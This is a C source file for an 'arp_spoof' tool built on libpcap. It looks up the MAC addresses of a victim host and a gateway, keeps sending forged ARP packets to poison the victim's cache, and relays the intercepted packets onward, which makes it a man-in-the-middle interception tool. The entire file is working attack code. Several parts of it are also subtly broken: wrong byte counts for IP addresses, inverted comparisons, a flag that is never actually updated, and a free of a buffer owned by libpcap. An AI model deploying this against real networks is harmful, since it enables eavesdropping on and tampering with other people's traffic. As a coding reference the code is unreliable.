#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <sys/socket.h>
#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>

#define ARP_REQUEST     1
#define ARP_REPLY       2

#define RE_OFF   0
#define RE_ON       1

#define UNKNOWN         0
#define UNICAST         1

static uint8_t BROADCAST[6] = "\xff\xff\xff\xff\xff\xff";

void send_arp(pcap_t* , uint8_t* , uint8_t* , uint8_t* , uint8_t* , uint8_t* , int);
void arp_reply(pcap_t*, uint8_t* , uint8_t* , uint8_t* , uint16_t* , int);


void get_mac(const char* , uint8_t*);
void get_ip(const char* , uint8_t*);

typedef struct _ETH_HD_ {
    uint8_t     eth_dst[6];
    uint8_t     eth_src[6];
    uint16_t    eth_typ;
} ETH_HD;

typedef struct _ARP_HD_ {
    uint16_t    hard_typ;
    uint16_t    proto_typ;
    uint8_t     mac_len;
    uint8_t     ip_len;
    uint16_t    opcode;
    uint8_t     sender_mac[6];
    uint8_t     sender_ip[4];
    uint8_t     target_mac[6];
    uint8_t     target_ip[4];
} ARP_HD;

typedef struct _IP_HD_ {
    uint8_t     ver_ihl;
    uint8_t     tos;
    uint16_t    total_len;
    uint16_t    iden;
    uint16_t    frag_offset;
    uint8_t     ttl;
    uint8_t     protocol;
    uint16_t    checksum;
    uint8_t     src_ip[4];
    uint8_t     dst_ip[4];
} IP_HD;

uint8_t* dalloc(unsigned long len)
{
    uint8_t* ret = NULL;
    ret = (uint8_t*)malloc(len);
    if(ret == NULL)
        exit(0);

    memset(ret, 0x00, len);
    return ret;
}

void show_mac(uint8_t* mac)
{
    printf("[ %02x:%02x:%02x:%02x:%02x:%02x ]\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void usage()
{
    printf(":: arp_spoof <interface> <sender ip 1> <target ip 1>\n");
}

int main(int argc, char* argv[])
{
    if(argc != 4)
    {
        usage();
        return 0;
    }

    uint16_t packet_size = 0;
    int flag = RE_OFF;

    const char* interface = argv[1];
    char errmy_arp[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errmy_arp);

    if (handle == NULL)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", interface, errmy_arp);
        exit(0);
    }

    uint8_t* my_mac = dalloc(16);
    uint8_t* my_ip = dalloc(16);
    get_mac(interface, my_mac);
    get_ip(interface, my_ip);

    uint8_t* sender_ip = dalloc(4);
    uint8_t* target_ip = dalloc(4);
    inet_pton(AF_INET, argv[2], sender_ip);
    inet_pton(AF_INET, argv[3], target_ip);


    uint8_t* sender_mac = dalloc(16);
    uint8_t* target_mac = dalloc(16);

    uint8_t* my_arp = dalloc(42);
    printf(":: Send packet to get target's MAC addr\n");
    send_arp(handle, my_mac, BROADCAST, my_ip, target_ip, my_arp, UNKNOWN);
    arp_reply(handle, target_mac, target_ip, my_ip, &packet_size, flag);
    printf(":: Send packet to get sender's MAC addr\n");
    send_arp(handle, my_mac, BROADCAST, my_ip, sender_ip, my_arp, UNKNOWN);
    arp_reply(handle, sender_mac, sender_ip, my_ip, &packet_size, flag);

    printf(":: Try to relay..\n");
    while(1)
    {
        send_arp(handle, my_mac, sender_mac, target_ip, sender_ip, my_arp, UNICAST);

        struct pcap_pkthdr* header = NULL;
        const uint8_t* packet = NULL;
        int res = pcap_next_ex(handle, &header, &packet);

        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        flag = RE_OFF;
        ETH_HD* eth = (ETH_HD*)packet;
        while(!flag)
        {
            printf("Send relay!\n");
            arp_reply(handle, sender_mac, sender_ip, target_ip, &packet_size, &flag);
            //ETH_HD* eth = (ETH_HD*)packet;
            memcpy(eth->eth_dst, target_mac, 6);
            memcpy(eth->eth_src, my_mac, 6);
            pcap_sendpacket(handle, packet, packet_size);
        }
        free(eth);
    }
    pcap_close(handle);

    free(my_mac);       free(my_ip);
    free(sender_ip);    free(target_ip);
    free(sender_mac);   free(target_mac);
    free(my_arp);
    return 0;
}

// ============================================================================

void gen_eth(ETH_HD* eth, uint8_t* src_mac, uint8_t* dst_mac)
{
    printf(":: in gen_eth\n");
    memcpy(eth->eth_dst, dst_mac, 6* sizeof(uint8_t));
    memcpy(eth->eth_src, src_mac, 6* sizeof(uint8_t));
    eth->eth_typ = htons(0x0806);
}

void send_arp(pcap_t* handle, uint8_t* src_mac, uint8_t* dst_mac, uint8_t* sender_ip, uint8_t* target_ip, uint8_t* my_arp, int flag)
{
    // gen_eth
    ETH_HD* eth = (ETH_HD*)(my_arp);
    memcpy(eth->eth_dst, dst_mac, 6* sizeof(uint8_t));
    memcpy(eth->eth_src, src_mac, 6* sizeof(uint8_t));
    eth->eth_typ = htons(0x0806);

    // gen_arp
    ARP_HD* arp = (ARP_HD*)(eth+1);

    arp->hard_typ = htons(1);
    arp->proto_typ = htons(0x0800);
    arp->mac_len = 6;
    arp->ip_len = 4;
    arp->opcode = htons(ARP_REQUEST);
    memcpy(arp->sender_mac, src_mac, 6 * sizeof(uint8_t));
    if(flag == UNKNOWN) memset(arp->target_mac, 0x00, 6 * sizeof(uint8_t));
    else memcpy(arp->target_mac, dst_mac, 6 * sizeof(uint8_t));
    memcpy(arp->sender_ip, sender_ip, 6 * sizeof(uint8_t));
    memcpy(arp->target_ip, target_ip, 6 * sizeof(uint8_t));

    // send packet
    pcap_sendpacket(handle, my_arp, 42);
}

void arp_reply(pcap_t* handle, uint8_t* sender_mac, uint8_t* sender_ip, uint8_t* target_ip, uint16_t* packet_size, int flag)
{
    while(1)
    {
        struct pcap_pkthdr* header;
        const uint8_t* packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        ETH_HD* eth = (ETH_HD*)packet;
        if(htons(eth->eth_typ) == 0x0806)
        {
            ARP_HD*arp=(ARP_HD*)(eth+1);
            if(arp->opcode == htons(ARP_REPLY) && memcmp(arp->sender_ip, sender_ip, 6))
            {
                memcpy( sender_mac, arp->sender_mac, 6* sizeof(uint8_t));
                printf("Sender Mac:"); show_mac(sender_mac);
                return;
            }

            if(arp->opcode == htons(ARP_REQUEST) && memcmp(arp->target_mac, BROADCAST, 6))
            {
                flag = RE_ON;
                printf("Victim Recovered\n");
                return;
            }
        }

        if(htons(eth->eth_typ) == 0x0800)
        {
            IP_HD* ip = (IP_HD*)(eth + 1);
            if(memcmp(ip->dst_ip, target_ip, 6* sizeof(uint8_t)))
            {
                printf("Packet Relayed...\n");
                *packet_size = htons(ip->total_len);
                break;
            }
        }
    }
}

void get_mac(const char* interface, uint8_t* mac)
{
    struct ifreq ifr;
    int socket_;
    if ((socket_ = socket(AF_INET, SOCK_STREAM,0)) < 0)
        exit(0);
    strcpy(ifr.ifr_name, interface);
    if (ioctl(socket_, SIOCGIFHWADDR, &ifr) < 0)
        exit(0);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6* sizeof(uint8_t));
}

void get_ip(const char*interface, uint8_t* ip)
{
    int socket_;
    struct ifreq ifr;
    socket_ = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    ioctl(socket_, SIOCGIFADDR, &ifr);
    memcpy(ip, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr), 6);
}

// EOF

